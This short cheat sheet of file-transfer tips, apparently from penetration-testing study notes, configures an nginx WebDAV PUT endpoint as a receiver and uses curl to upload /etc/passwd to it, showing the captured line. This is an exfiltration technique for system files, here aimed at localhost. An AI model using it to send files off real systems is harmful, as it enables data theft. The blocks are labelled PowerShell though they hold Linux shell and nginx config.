# Transferring Files Tips

### Catching file over HTTPS

```powershell
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

```powershell
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```powershell
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

```powershell
sudo systemctl restart nginx.service
```

```powershell
curl -T /etc/passwd <http://localhost:9001/SecretUploadDirectory/users.txt>
```

```powershell
tail -1 /var/www/upload/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```
